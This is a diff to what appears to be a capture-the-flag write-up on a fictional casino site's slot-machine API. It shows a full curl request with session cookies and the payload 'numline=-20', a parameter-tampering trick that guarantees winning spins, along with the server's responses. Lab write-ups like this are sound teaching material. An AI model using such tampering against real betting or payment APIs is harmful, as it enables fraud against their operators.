@@ -11,7 +11,7 @@ Test the security of Jack Frost's [slot machines](https://slots.jackfrosttower.c
 **Parameter Tampering** - *Noel Boetie*: “It seems they're susceptible to [parameter tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering).”
 
 ### 4.3. Solution
-Playing around with parameters in the requests it is possible to identify that the spin API is susceptible to parameter tampering. 
+Playing around with parameters in the requests it is possible to identify that the `spin` API is susceptible to parameter tampering. 
 
 The request for a spin is:
 ```bash
@@ -62,7 +62,7 @@ curl 'https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd
 }
 ```
 
-Setting the numline parameter to a negative number guarantees to always win:
+Setting the `numline` parameter to a negative number guarantees to always win:
 ```bash
 curl 'https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd45/spin'   -H 'authority: slots.jackfrosttower.com'   -H 'pragma: no-cache'   -H 'cache-control: no-cache'   -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"'   -H 'accept: application/json'   -H 'content-type: application/x-www-form-urlencoded'   -H 'sec-ch-ua-mobile: ?0'   -H 'x-ncash-token: eab79bec-5017-43f9-899a-4b1bddc1644c'   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'   -H 'sec-ch-ua-platform: "Windows"'   -H 'origin: https://slots.jackfrosttower.com'   -H 'sec-fetch-site: same-origin'   -H 'sec-fetch-mode: cors'   -H 'sec-fetch-dest: empty'   -H 'referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-206983/index.html'   -H 'accept-language: en-US,en;q=0.9,it;q=0.8'   -H 'cookie: XSRF-TOKEN=eyJpdiI6IjB5N2hVOWcvTUdYZ3BWd3pxU1dzYmc9PSIsInZhbHVlIjoiTGI3SURSM1NsTW10YUtQeC84T0pVelRaRjI2YWxFWk5JYlRscEovUXFKem1tdWhaK1pUS3BxMkJPRExCMzNPYUFINFZDd29BM3E5TnBrdEh5L01LRDF5ZG1HZjdTanNsRGVxZlg3cEVmZnBKSHFNWlZJMFMzSGVEWnMrbmRoeHQiLCJtYWMiOiJhZDkyZDIzM2UzYzMxMDQ1MDcwMTNkMTU2ODVhMWMyNzgzODBjYWU0OGE1ZTEzNzkzODI4MDZhNjhiZDU5Yzc2IiwidGFnIjoiIn0%3D; slots_session=eyJpdiI6IkRpdFM3QjdxS0N4dThxRGdSVlZLemc9PSIsInZhbHVlIjoiSnVhbGtHZVhkTTd3ZHEzNkNkWkgzL3dMbEJ0OVdzZEh4RXoyVXlLM2ovSDJsM2hUQkdRUFc3TlJNRUY4YjBZTlpBQ000Z2g1RnNPdTh5MjNXTVo3N3ZEZFQwRmRueDhuY0RiRzNkbmUydkJYY2w3RUQ2WmRiYzNlZXZkRmFHZXkiLCJtYWMiOiJhMDkzYjBlODZhMzQyYThlNDM2M2I1OTk0M2I3NDdiOGMyZjY4OGM3NjUzM2EzMGMzYjg3ZTk4NTNlOTE0NTNhIiwidGFnIjoiIn0%3D'   --data-raw 'betamount=1&numline=-20&cpl=0.1'   --compressed
 ```
@@ -111,7 +111,7 @@ curl 'https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd
 }
 ```
 
-Over a certain amount (presumably 500 credits), the system starts complaining with the message “You won... but something looks suspicious to me.” but does not actually block further tampered requests:
+Over a certain amount (presumably 500 credits), the system starts complaining with the message `You won... but something looks suspicious to me.` but does not actually block further tampered requests:
 ```js
 {
   "success": true,
@@ -157,7 +157,7 @@ Over a certain amount (presumably 500 credits), the system starts complaining wi
 }
 ```
 
-When the amount gets greater than 1000 then the message becomes “I'm going to have some bouncer trolls bounce you right out of this casino!”, which is the answer for this challenge:
+When the amount gets greater than 1000 then the message becomes `I'm going to have some bouncer trolls bounce you right out of this casino!`, which is the answer for this challenge:
 ```js
 {
   "success": true,
